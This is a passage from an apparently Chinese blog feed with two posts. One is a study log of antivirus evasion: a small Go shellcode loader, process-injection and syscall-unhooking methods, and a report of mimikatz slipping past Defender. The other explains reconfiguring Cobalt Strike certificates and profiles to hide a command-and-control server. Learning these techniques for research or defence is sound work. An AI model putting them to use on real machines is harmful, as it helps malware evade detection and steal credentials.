<h5 id="WinXP适配"><a href="#WinXP适配" class="headerlink" title="WinXP适配"></a>WinXP适配</h5><p>虽然Syswhispers是支持XP的，但是直接编译出来的程序放到XP上跑直接显示<code>not a valid win32 application</code>，简单搜一下是windows不同系统使用的sdk有差距，远古XP系列以及被弃用了，所以还得用VS装一个XP工具集，使用visual studio install装一个即可。<br>然而装了也不一定编译的起来，期间我遇到了各种各样的问题，改了一堆配置但是想不起来几个了<br><a href="https://stackoverflow.com/questions/58417992/how-to-compile-code-for-windows-xp-in-visual-studio-2017">How to compile code for Windows XP in Visual Studio 2017</a></p>
<p>然后就在XP上跑起来了，然而放到win2003上还是跑不起来，理论上2003应该是xp的服务器版本啊？（维基百科说的）报错为<a href="https://superuser.com/questions/164671/the-procedure-entry-point-decodepointer-could-not-be-located-in-the-dynamic-link">The procedure entry point DecodePointer could not be located in the dynamic link library KERNEL32.dll</a>，非常抽象，但是kernel32.dll是一个非常核心的dll。可能是因为我这个2003虚拟机是32位的？而原生SysWhispers不支持32位？但是xp也是32位的啊。。。。而被魔改的SysWhispers_x86又不支持XP工具集，导致在32位的XP系列系统上无法成功利用</p>
<p>但总而言之我算是基本会用了。。。虽然对手写windows API调用还是没什么认知</p>
<h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4><p>windows7,10,2008三个64位虚拟机均能上线<br>32位XP能上线<br>32位2003不行，原因未知</p>
<p>免杀效果，win10物理机windows defender落地击杀，win10虚拟机报警但未阻止，低版本windows乱杀。学弟给我发了个他写的rust的马，他说本地火绒defender都过了，VT只有五个引擎查出来，然后我这边下载下来落地击杀。。。defender真无敌啊。。。<br>VT的话能有十多个引擎查出来，能用就行啦</p>
<h3 id="go免杀"><a href="#go免杀" class="headerlink" title="go免杀"></a>go免杀</h3><p>新型语言类免杀，代表作品为go和rust。主要原因可能是新型语言编译出来的东西和传统C差距过大，并且这类语言由于不像C可以依赖机器自带的一套libc一类的东西，需要打包自己实现的一系列底层操作，导致整体分析复杂的一比。<strong>简单的说就是和杀软比速度，现在杀软的分析对于新型语言并不成熟从而进行绕过。</strong>作为编译型语言也不需要目标机器存在解释器，理论上来说是没有太多依赖需求的。然后就会使得我不太能理解这些东西怎么跑起来的，可能真的自己实现了一套底层然后编译时超级静态链接打包吧。。。</p>
<p>但是想使用go写马，就有一种非常奇怪的感觉，用一个感觉比较高等级的语言，在这里指来指去。。。感觉都封装的很好，不需要考虑什么情况的复杂结果，我反而需要去看他内部怎么实现，传值传引用，然后进行各种底层的一逼的内存操作。。。折磨王</p>
<p>学习思路参考项目<a href="https://github.com/safe6Sec/GolangBypassAV">GolangBypassAV</a><br>然而在这之前，需要一些奇怪的前置知识和go语言基础。</p>
<h4 id="语言基础"><a href="#语言基础" class="headerlink" title="语言基础"></a>语言基础</h4><h5 id="unsafe-Pointer与uintptr"><a href="#unsafe-Pointer与uintptr" class="headerlink" title="unsafe.Pointer与uintptr"></a>unsafe.Pointer与uintptr</h5><p>用C写马时需要获取shellcode地址分配内存改可执行内存拷贝等各种操作，直接使用指针似乎比较易于理解，而在go里面shellcode的加载是一致的，然而你仍然需要进行各种复杂的内存操作。go中使用unsafe.Pointer和uintptr进行指针类型的地址操作</p>
<p>go的话比较玄幻，不允许地址被直接转换为指针，而是要套一层unsafe.Pointer，这个玩意就像一个中转，或者说一个void指针，想从一个指针转移到另一个指针就需要使用这个东西</p>
<p>uintptr，这个玩意一般会配合unsafe.Pointer使用，但是这个东西又不是一个指针，而是一个可以用来记载地址的无符号数（说起来指针实际上不也就是一个记载地址的无符号数），反正go在指针这里套了一堆，如果想对地址进行加减操作，就需要将unsafe.Pointer转换成uintptr<br>文档上写的也很抽象</p>
<blockquote>
<p>uintptr is an integer type that is large enough to hold the bit pattern of any pointer.</p>
</blockquote>
<p>所以说实际上是个数字</p>
<p>光说是没有用的捏，实际用起来就知道有多抽象了<br><a href="https://www.cnblogs.com/echojson/p/10743530.html">Go之unsafe.Pointer &amp;&amp; uintptr 类型</a></p>
<h5 id="Array与Slice"><a href="#Array与Slice" class="headerlink" title="Array与Slice"></a>Array与Slice</h5><p>现代语言一般来说都实现了可变数组，就C++也有经典vector之类的东西，go也不例外。go中的array就是经典的不可变数组，而slice则是可变数组，在声明上类似</p>
<pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// Array</span>
a <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">}</span>
<span class="token comment" spellcheck="true">// Slice</span>
b <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">}</span>
</code></pre>
<p>这就是非常抽象的一点，先不说这个类型放后面的反人类操作，C中隐式声明定长数组的操作在这里就变成声明了一个变长数组了。一度令我感到困惑<br><strong>go中，只有括号里带数字的是定长数组，其余皆为切片</strong></p>
<p>除此之外，套用C的思路，一般来说数组作为参数传入的直接是数组头指针，也就是传引用，而在go中array和slice均为传值，即函数内修改值不会影响实际值？但实际上slice是由一个结构体实现的，内部还是一个数组，而结构体中的数组却又是由指针进行存储的。所以slice其实又传了引用，但没完全传。。。。</p>
<p>slice内部大概就是这么个样子，乱写的，可能类型不太对。。。反正这里的arr是一个指向实际实现的数组的指针</p>
<pre class=" language-go"><code class="language-go"><span class="token punctuation">{</span>
    <span class="token keyword">var</span> arr <span class="token builtin">uintptr</span>
    <span class="token keyword">var</span> <span class="token builtin">len</span> <span class="token builtin">int</span>
    <span class="token keyword">var</span> <span class="token builtin">cap</span> <span class="token builtin">int</span>
<span class="token punctuation">}</span>
</code></pre>
<p><a href="https://segmentfault.com/q/1010000000122913">关于Go语言中数组的参数传递问题</a><br><a href="https://zhuanlan.zhihu.com/p/54780689">【Go】深入剖析slice和array</a></p>
<h5 id="GO-windows-API操作"><a href="#GO-windows-API操作" class="headerlink" title="GO windows API操作"></a>GO windows API操作</h5><p>使用syscall包进行（说起来这个包好像已经被弃用了）<br>想用windows API必然需要加载dll，可以使用如下三个函数进行加载，参数都是dll名字符串，很简单<br><code>syscall.NewLazyDLL syscall.LoadLibrary syscall.MustLoadDLL</code><br>区别不晓得，网上还搜不到太详细的资料，官方文档都没有？NewLazyDLL一看就知道是用时才加载，LoadLibrary能是即时加载吧，MustLoadDLL是加载出错会产生panic</p>
<p>加载了DLL之后还需要从DLL中获取需要使用的系统调用，这里也有三个函数<br><code>MustFindProc NewProc syscall.GetProcAddress</code>，前两个函数作为dll的方法调用，需要的参数为需要使用的函数名字符串，不需要函数签名（dll里面没有函数重载吗？函数根据到时候调用时使用的参数进行重载？）<br>最后一个函数需要传入dll和函数名两个参数</p>
<p><em>上述所有函数均有两个返回值，分别是结果和错误<br>下述所有系统调用要求入参全部都是uintptr类型，然后就会出现我之前提到的unsafe.Pointer+uintptr套娃问题，如果参数本身是数字的话uintptr本身就是数字，不用类型转换，返回值为三个，第一个是结果，第二个不知道，第三个是错误</em></p>
<p>得到函数之后就可以发起系统调用了，调用使用<code>func.Call</code>即可。第一个参数是参数个数，然后接参数</p>
<p>直接发起系统调用则需要使用<code>syscall.Syscall</code>，这个函数有一个系列<br><code>syscall.Syscall/6,9,12,15</code>，分别代表参数为3-5,6-8….个参数的系统调用，上限15个参数。函数的第一个参数是得到的函数的地址，第二个参数是输入的参数数量，然后就是参数<br><a href="https://www.ascotbe.com/2021/09/04/GoUseWindowsApi/">Go使用WindowsApi笔记</a></p>
<p>用得到的知识写一个破烂，最简单的直接把shellcode写在变量里，然后让变量所在的内存可执行直接调用</p>
<pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
    <span class="token string">"syscall"</span>
    <span class="token string">"unsafe"</span>
<span class="token punctuation">)</span>
<span class="token keyword">const</span> <span class="token punctuation">(</span>
    PAGE_EXECUTE_READWRITE <span class="token operator">=</span> <span class="token number">0x40</span>
<span class="token punctuation">)</span>
<span class="token keyword">var</span> procVirtualProtect <span class="token operator">=</span> syscall<span class="token punctuation">.</span><span class="token function">NewLazyDLL</span><span class="token punctuation">(</span><span class="token string">"kernel32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">NewProc</span><span class="token punctuation">(</span><span class="token string">"VirtualProtect"</span><span class="token punctuation">)</span>
<span class="token keyword">func</span> <span class="token function">VirtualProtect1</span><span class="token punctuation">(</span>lpAddress <span class="token builtin">uintptr</span><span class="token punctuation">,</span> dwSize <span class="token builtin">uintptr</span><span class="token punctuation">,</span> flNewProtect <span class="token builtin">uintptr</span><span class="token punctuation">,</span> lpflOldProtect <span class="token builtin">uintptr</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">///ad</span>
    ret<span class="token punctuation">,</span> <span class="token boolean">_</span><span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> procVirtualProtect<span class="token punctuation">.</span><span class="token function">Call</span><span class="token punctuation">(</span>
        lpAddress<span class="token punctuation">,</span>
        dwSize<span class="token punctuation">,</span>
        flNewProtect<span class="token punctuation">,</span>
        lpflOldProtect<span class="token punctuation">)</span>
    <span class="token keyword">return</span> ret <span class="token operator">></span> <span class="token number">0</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">run</span><span class="token punctuation">(</span>shellcode <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> old <span class="token builtin">uint32</span>
    <span class="token function">VirtualProtect1</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">uintptr</span><span class="token punctuation">)</span><span class="token punctuation">(</span>unsafe<span class="token punctuation">.</span><span class="token function">Pointer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">uintptr</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">,</span> <span class="token function">uintptr</span><span class="token punctuation">(</span>unsafe<span class="token punctuation">.</span><span class="token function">Pointer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>old<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    addr <span class="token operator">:=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">uintptr</span><span class="token punctuation">)</span><span class="token punctuation">(</span>unsafe<span class="token punctuation">.</span><span class="token function">Pointer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token boolean">_</span><span class="token punctuation">,</span> <span class="token boolean">_</span><span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> syscall<span class="token punctuation">.</span><span class="token function">Syscall</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    b <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">{</span>shellcode<span class="token punctuation">}</span>
    <span class="token function">run</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre>
<p>整体下来只有一个操作比较难以理解，就是这个<code>*(*uintptr)(unsafe.Pointer(&amp;shellcode)</code><br>考虑一下，这里的shellcode是一个切片，切片是传值的，因此对shellcode取址得到的是一个指向slice结构体的指针，而这里将这个指针通过unsafe.Pointer转换为了一个uintptr的指针，即，将指向slice结构体的指针变成了一个指向uintptr的指针，而slice的开头刚好是一个指向内部数组的uintptr，对其解引用，得到了指向内部数组的uintptr<br>然后将该指针传入VirtualProtect中，修改内存为可执行，并使用系统调用将指令寄存器指向改地址执行shellcode</p>
<p>后来看见了另一个写法。。。<code>uintptr(unsafe.Pointer(&amp;a[0]))</code>总觉得简单明了了不少。。。直接把数组头地址作为指针不是看起来好理解多了吗。。。之前那个操作还多套一层让我理解半天</p>
<p>实现了一个最基础的go语言的直接的shellcode加载器。</p>
<h4 id="Bypass方案"><a href="#Bypass方案" class="headerlink" title="Bypass方案"></a>Bypass方案</h4><p>不想动手捏。。。就着这个项目看吧<br>确实大部分都是对普通的利用方法的go重写？</p>
<h5 id="CreateFiber"><a href="#CreateFiber" class="headerlink" title="CreateFiber"></a>CreateFiber</h5><p>使用纤程的概念注入shellcode。。。头一次听到这个概念<br><a href="http://blog.leanote.com/post/snowming/fcdac52e3b5b">利用纤程进行 Shellcode 本地进程注入</a><br>就是把线程捏成更小的线程？这个线程是用户态实现的，所以线程切换不需要进内核，减少开销<br>用到这几个函数，均位于kernel32.dll</p>
<pre class=" language-C++"><code class="language-C++">LPVOID ConvertThreadToFiber(
  [in, optional] LPVOID lpParameter
);

LPVOID CreateFiber(
  [in]           SIZE_T                dwStackSize,
  [in]           LPFIBER_START_ROUTINE lpStartAddress,
  [in, optional] LPVOID                lpParameter
);

void SwitchToFiber(
  [in] LPVOID lpFiber
);
</code></pre>
<p>第一个函数不用传参也能用<br>第二个函数需要传一个栈大小和一个开始的地址（显然开始地址就是shellcode地址）<br>第三个函数传入CreateFiber的指针</p>
<h5 id="CreateProcess"><a href="#CreateProcess" class="headerlink" title="CreateProcess"></a>CreateProcess</h5><p>创建一个子进程注入shellcode，直接用的<code>golang.org/x/sys/windows</code>包下的CreateProcess函数，然后用VirtualAlloc和VirtualProtect的Ex版本跨进程申请内存和修改权限<br>使用<code>WriteProcessMemory</code>函数写入shellcode</p>
<p>接下来的操作是读了好多次内存，不太熟悉看不懂。。。。可能是为了确认主进程的入口位置，然后再写一次内存改机器码直接jump到shellcode处</p>
<h5 id="CreateProcessWithPipe"><a href="#CreateProcessWithPipe" class="headerlink" title="CreateProcessWithPipe"></a>CreateProcessWithPipe</h5><p>感觉就是多套了一层管道获取了stdout看输出。。。对我们这种直接CS上线的感觉没什么区别<br>不过可以看一下这个管道介绍的文章<br><a href="https://cloud.tencent.com/developer/article/1625924">浅谈 windows 命名管道</a></p>
<h5 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h5><p>进程注入操作，通过<code>OpenProcess</code>获取目标进程的handler，然后<code>VirtualAllocEx</code>和<code>WriteProcessMemory</code>等组合拳申请内存写入改成可执行，最后调用<code>CreateRemoteThreadEx</code>，以写入的shellcode地址作为RemoteThread的地址完成注入</p>
<p>CreateRemoteThread就是创建一个给与地址作为入口点的线程，Remote可能体现在在给与的handler对应的进程中创建，这个函数也有一个Ex版，似乎只是增加了更多参数选项。<br>该方法可以配合LoadLibrary完成DLL注入，不过需要额外写shellcode调用<code>LoadLibraryA</code>这个函数<br>感觉直接写shellcode可能还来的快一点？常见的注入进程是经典svchost</p>
<p><a href="https://threathunterplaybook.com/notebooks/windows/05_defense_evasion/WIN-180719170510.html">DLL Injection via CreateRemoteThread and LoadLibrary</a><br>这里面也提到了两个undocumented的创建线程的函数NtCreateThreadEx，RtlCreateUserThread，之前有一次go写的马在老版本机器上跑不起来，报错是ntdll.dll找不到，windows大师和我说这个是核心dll肯定找得到，可能是因为我用了undocumented API</p>
<p>也有一个CreateThread函数用于在当前进程内创建线程</p>
<h5 id="CreateRemoteThreadNative"><a href="#CreateRemoteThreadNative" class="headerlink" title="CreateRemoteThreadNative"></a>CreateRemoteThreadNative</h5><p>和普通的没什么区别，就是把用go的windows包的OpenProcess换成了syscall从kernel32.dll里翻出来的OpenProcess<br>（说起来看了一下windows包的实现感觉也还是syscall）</p>
<h5 id="CreateThread"><a href="#CreateThread" class="headerlink" title="CreateThread"></a>CreateThread</h5><p>创建本地线程</p>
<h5 id="CreateThreadNative"><a href="#CreateThreadNative" class="headerlink" title="CreateThreadNative"></a>CreateThreadNative</h5><p>windows包换syscall</p>
<h5 id="RtlCreateUserThread"><a href="#RtlCreateUserThread" class="headerlink" title="RtlCreateUserThread"></a>RtlCreateUserThread</h5><p>类似于<code>CreateRemoteThread</code>，进程注入操作，换了个API，与<code>EtwpCreateEtwThread</code>一样属于undocumented API<br><a href="http://undocumented.ntinternals.net/index.html?page=UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html">RtlCreateUserThread</a></p>
<h5 id="dpapi"><a href="#dpapi" class="headerlink" title="dpapi"></a>dpapi</h5><p>用了windows的data protect api（dpapi），对shellcode进行加解密，但是没看懂捏？怎么只有加密没有解密？</p>
<h5 id="EtwpCreateEtwThread"><a href="#EtwpCreateEtwThread" class="headerlink" title="EtwpCreateEtwThread"></a>EtwpCreateEtwThread</h5><p>整体操作与CreateThread区别不大，但是创建线程的方式使用了这个奇怪的函数，这是一个<code>undocumented API</code>，所以使用冷门API可能会导致绕过杀软，也可能导致在老版本系统上跑不起来</p>
<blockquote>
<p>The list that follows is of ETW functions implemented in NTDLL version 6.0, i.e., for Windows Vista</p>
</blockquote>
<p><a href="https://www.geoffchappell.com/studies/windows/win32/ntdll/api/etw/index.htm">Event Tracing for Windows</a></p>
<p>关于windows版本，确实有点难理清楚，可以看维基百科，XP和2003的版本号分别是5.1和5.2，就用不了这个API</p>
<h5 id="HeapAlloc-1"><a href="#HeapAlloc-1" class="headerlink" title="HeapAlloc"></a>HeapAlloc</h5><p>创建一个堆来分配内存。（说起来VirtualAlloc分配的内存难道就不在堆上了吗。。。）<br>除了使用堆分配相关的函数外并无新意</p>
<h5 id="Hgate"><a href="#Hgate" class="headerlink" title="Hgate"></a>Hgate</h5><p>地狱之门的强化版。均为防止杀软hook系统调用导致shellcode无法执行的方案。<br>与SysWhisper的思路类似，通过从ntdll中直接还原出系统调用号，直接发起系统调用绕过杀软hook。<br>windows装载进程进内存时，第一个模块是PE文件本身，第二个模块就是ntdll.dll，第三个是kernel32.dll。<br>然后windows有一个究极PEB结构，里面有双向链表可以把各个模块连起来，由此可以获取到ntdll的地址</p>
<p>地狱之门的缺点在于设计的比较原始，ntdll的位置被杀软修改之后就跑不起来了，光环之门则通过从杀软没有hook的系统调用的位置加加减减获取全部系统调用的位置。。。但我的智力条件有限，看的不是很懂。。。<br>这篇文章拉满了<br><a href="https://tttang.com/archive/1464/">syscall的前世今生</a></p>
<h5 id="EarlyBird"><a href="#EarlyBird" class="headerlink" title="EarlyBird"></a>EarlyBird</h5><p>和<code>NtQueueApcThreadEx</code>为APC二连。APC是进程注入的一种捏，不过是新开进程注入的那种，CreateRemoteThread可以找一个已经存在的目标进程注入进去，所以和CreateProcess有点像。<br>不过CreateProcess需要该程序入口的汇编jump到shellcode上，对应不同的架构需要做很多额外的处理，而这里在创建进程分配内存写入数据修改为可执行后，直接使用了一个<code>QueueUserAPC</code>把shellcode地址作为APC任务的回调函数，resume的时候会优先清空APC队列，触发回调shellcode</p>
<p>该方案是一种逃避动态监测的方案。因为NtTestAlert在线程开始之前触发，杀软可能在进程启动时对危险API进行hook，在线程开始前把shellcode跑完就不用担心被hook了</p>
<h5 id="NtQueueApcThreadEx"><a href="#NtQueueApcThreadEx" class="headerlink" title="NtQueueApcThreadEx"></a>NtQueueApcThreadEx</h5><p>APC 进程注入，APC章节提到的新版本windows10实现的新系统调用，可主动触发APC，可能没有那么快被hook，但是只兼容新版本+使用不当可能死锁之类的程序崩溃。感觉不一定好用</p>
<h5 id="UuidFromString"><a href="#UuidFromString" class="headerlink" title="UuidFromString"></a>UuidFromString</h5><p>应该是用的这个师傅的思路，其实感觉和AES等加密方式的区别并不是很大，只是换了一种shellcode存储的方式，可能能够通过调用奇怪的系统调用打乱杀软对调用顺序的检测？也有说法这个是白名单函数，用起来比较安全什么的。。。<br>然后在shellcode的触发上没有使用常见的直接调用，而是用了个EnumSystemLocalesA函数，将shellcode地址作为函数指针传入该函数的回调函数中进行触发<br>这里在开发的时候有一个小注意点，<code>u := append([]byte(uuid), 0)</code>，因为系统调用需要传一个指向uuid的指针进去，而C的字符串是以0截断的，所以这里将uuid转换为byte数组然后补一个0上去<br>文中也提到了用mac和ipv6地址等方案实现的想法<br><a href="https://www.crisprx.top/archives/515">CS 内存加载器免杀及实现</a></p>
<p>这个操作编译出来的马还真就没被defender爆杀。大部分操作都能乱按，启动vnc会被抓，但甚至能在我的物理机上运行mimikatz，运行完刚把结果传回来就被defender发现，然后defender给我电脑高强度重启了。。。但确实把数据拿到并且回传了。</p>
<p>直接编译出来的文件运行时会有一个黑框，编译时加一个<code>-ldflags=&quot;-H windowsgui&quot;</code>的buff即可去除</p>
<p>这种马在被defender标记为危险后会直接被检查hash瞬杀，而进程注入类的被抓包的是被检测的进程，只会杀掉那个进程，而注入用的马并不会被发现</p>
<h4 id="反沙箱"><a href="#反沙箱" class="headerlink" title="反沙箱"></a>反沙箱</h4><p>感觉其实没什么用，因为传一个马上去又不可能立刻开个沙箱去检测，我先把马跑起来等你后续随便检测</p>
<p>抄个项目，能用就行<br><a href="https://github.com/timwhitez/Doge-Loader/blob/main/enhancement/sandbox.go">timwhitez&#x2F;Doge-Loader</a></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/luckyfuture0177/ReZeroBypassAV">ReZeroBypassAV</a><br><a href="https://repnz.github.io/posts/apc/user-apc/#nttestalert">APC Series: User APC API</a><br><a href="https://www.cyberbit.com/blog/endpoint-security/new-early-bird-code-injection-technique-discovered/">New Early Bird Code Injection Technique Discovered</a><br><a href="https://0x00sec.org/t/process-injection-apc-injection/24608">Process Injection: APC Injection</a><br><a href="https://vxug.fakedoma.in/papers/VXUG/Exclusive/HellsGate.pdf">HellsGate.pdf</a><br><a href="https://rioasmara.com/2022/03/09/hellgate-technique-on-av-bypass/">HELLGATE TECHNIQUE ON AV BYPASS</a><br><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-Windows-Defender">渗透基础——Windows Defender</a><br>这个系列非常牛逼，还没看完<br><a href="https://github.com/TideSec/BypassAntiVirus">TideSec&#x2F;BypassAntiVirus</a><br><a href="https://www.freebuf.com/articles/system/227461.html">远控免杀从入门到实践（1）：基础篇</a><br><a href="https://www.freebuf.com/articles/system/234365.html">Mimikatz的18种免杀姿势及防御策略</a></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>CobaltStrike SSL证书配置</title>
    <url>/CobaltStrike%20SSL%E8%AF%81%E4%B9%A6%E9%85%8D%E7%BD%AE.html</url>
    <content><![CDATA[<h1 id="CobaltStrike-SSL证书配置"><a href="#CobaltStrike-SSL证书配置" class="headerlink" title="CobaltStrike SSL证书配置"></a>CobaltStrike SSL证书配置</h1><p>起因是我发现我的机器由于长期挂着CS的服务端，然后导致我被扫描器发现，并且把我的机器标记成威胁服务器了。。。。<br>而为了隐藏CS服务端的信息，就需要从几个方面进行改造，其中之一就是经典的ssl证书配置，而其实CS主要需要配的证书有两个：cobaltstrike.store&amp;https-certificate</p>
<p>期间踩了一个很大的坑，关于在win7等较老机器上使用https出现的tls版本问题</p>
<h2 id="cobaltstrike-store"><a href="#cobaltstrike-store" class="headerlink" title="cobaltstrike.store"></a>cobaltstrike.store</h2><p>teamserver脚本中用keytools生成了一个特征及其明显的自签发证书。该证书仅用于客户端与服务端之间的通信，当然，被扫出来就会是及其明显的服务端标记特征。我估摸着也就是扫描器扫到这个证书然后给我标记了。。。</p>
<pre class=" language-shell"><code class="language-shell">keytool -keystore ./cobaltstrike.store -storepass s0m3th1ng3ls3 -keypass s0m3th1ng3ls3 -genkey -keyalg RSA -alias cobaltstrike -dname "CN=microsoft.com, OU=microsoft, O=MicroSoft, L=AAA, S=BBB, C=CN"
</code></pre>
<p>方法也很简单，乱写一个新的看起来合理一点的自签发证书就行了</p>
<p>这个证书的主要功能是让暴露在公网中的CS服务端不那么容易被发现</p>
<h2 id="https-certificate"><a href="#https-certificate" class="headerlink" title="https-certificate"></a>https-certificate</h2><p>如果listener选用的是https的话，这个才是CS与beacon之间通信时使用的证书，默认是CS自签发的上述CN等内容均为空的假证书。如果环境中部署了IDS等机器的话，CS默认证书的特征就有可能被发现。指定证书后，https的listener会使用新的证书和beacon进行沟通，抹掉特征<br>这个证书需要在profile里配置，有三个选择</p>
<pre><code>https-certificate &#123;
    
    ## Option 1) Trusted and Signed Certificate
    ## Use keytool to create a Java Keystore file. 
    ## Refer to https://www.cobaltstrike.com/help-malleable-c2#validssl
    ## or https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/HTTPsC2DoneRight.sh
   
    ## Option 2) Create your own Self-Signed Certificate
    ## Use keytool to import your own self signed certificates

    #set keystore &quot;/pathtokeystore&quot;;
    #set password &quot;password&quot;;

    ## Option 3) Cobalt Strike Self-Signed Certificate
    set C   &quot;US&quot;;
    set CN  &quot;jquery.com&quot;;
    set O   &quot;jQuery&quot;;
    set OU  &quot;Certificate Authority&quot;;
    set validity &quot;365&quot;;
&#125;
</code></pre>
<p>profile具体配置可以看这个<a href="https://github.com/threatexpress/malleable-c2">threatexpress&#x2F;malleable-c2</a><br>与此同时，CS的http流量也有比较明显的特征，可以通过profile将通信规则伪造成jquery，Amazon，Microsoft等看起来比较合理的网站流量，也是一种隐藏手段。</p>
<p>上述三个证书中，真证书没什么好说的，但是如果想在web delivery中使用ssl的假证书的话，得用2中keytools签发的假证书，用3自签发的假证书启动后CS那个ssl的地方勾不了</p>
<p>该配置作用即为在与beacon通信时使用新证书覆盖CS默认特征逃避检测。但这里存在一个问题，为什么网络上的教程都是需要签发一个真证书？为什么不能用自签名的假证书呢？</p>
<h2 id="web-delivery-SSL"><a href="#web-delivery-SSL" class="headerlink" title="web delivery SSL"></a>web delivery SSL</h2><p>主要问题出在web delivery这边<br>简单尝试了powershell和bitsadmin两种payload，对于自签发的假证书，powershell和bitsadmin还有certutil都会进行证书合法性校验，然后由于假证书过不了校验，会报出一个<code>基础连接已经关闭：未能为SSL/TLS 安全通道建立信任关系</code>的错误，网上搜了几个加buff忽略证书错误的操作，好像还是屁用没有。。。</p>
<p>对于低版本windows（这里试的是win7），web delivery各种打不通，真证书也不行，报错为<code>基础连接已经关闭: 发送时发生错误</code>，简单搜索都说是win7对tls版本的支持问题，网上搜了几个buff加上去，还是屁用没有。。。http下倒是可以，然而再把下下来的马回连listener的时候，https的listener又打不通。。。最后http的web delivery+http listener打通了。</p>
<h2 id="win7使用https上线"><a href="#win7使用https上线" class="headerlink" title="win7使用https上线"></a>win7使用https上线</h2><p>直接生成一个beacon.exe跑一下，wireshark抓包，会发现win7尝试用tls1.2去连接CS服务器，然后CS服务器应答一个<code>Alert(Level: Fatal,Description: Protocol Version)</code>，感觉意思是不支持tls1.2。但是换成win10，也是发的tls1.2，然后就行了。。。什么原理</p>
<p>然后开一个https的web delivery，再用wireshark抓包，还是tls1.2？<br>但是用百度得到的这个命令<code>[Net.ServicePointManager]::SecurityProtocol</code>的输出结果是<code>ssl3,tls</code>，看不懂。。。</p>
<p>总之，最后通过谷歌搜索到了这个链接<br><a href="https://www.ch1ng.com/blog/253.html">解决 Cobalt Strike HTTPS Listener 无法在 Win7 运行问题</a><br>大致意思就是jdk更新之后禁用了tls1.0和1.1，在CS服务端把tls老版本启用就好了</p>
<p>然后关于win7发1.2为什么不行，又检查了一下。。。原来是wireshark的显示问题，win7其实是想协商tls1.0的，但是wireshark粗略显示的确是1.2，点开看详细的才显示是1.0。迷惑了我好久。。。</p>
<p><img src="/images/CobaltStrike_SSL%E8%AF%81%E4%B9%A6%E9%85%8D%E7%BD%AE/image-20220612170334704.png" alt="image-20220612170334704"></p>
<p>看了下win7只对外协商tls1.0和ssl3.0，而正如上文所述，java在更新中弃用了老算法，导致老一点的tls协议不接受，所以连不上，启用后即可接受tls1.0成功上线了</p>
<p>翻到了微软文档</p>
<blockquote>
<p>Windows 8.1, Windows Server 2012 R2, Windows 10, Windows Server 2016, and later versions of Windows natively support TLS 1.2 for client-server communications over WinHTTP.</p>
</blockquote>
<p>Earlier versions of Windows, such as Windows 7 or Windows Server 2012, don’t enable TLS 1.1 or TLS 1.2 by default for secure communications using WinHTTP. For these earlier versions of Windows, install Update 3140245 to enable the registry value below, which can be set to add TLS 1.1 and TLS 1.2 to the default secure protocols list for WinHTTP. </p>
<p><a href="https://docs.microsoft.com/en-us/mem/configmgr/core/plan-design/security/enable-tls-1-2-client">How to enable TLS 1.2 on clients</a></p>
<p>估计之前从网上搜的加buff支持1.2没有用可能是因为虚拟机没怎么更新吧。</p>
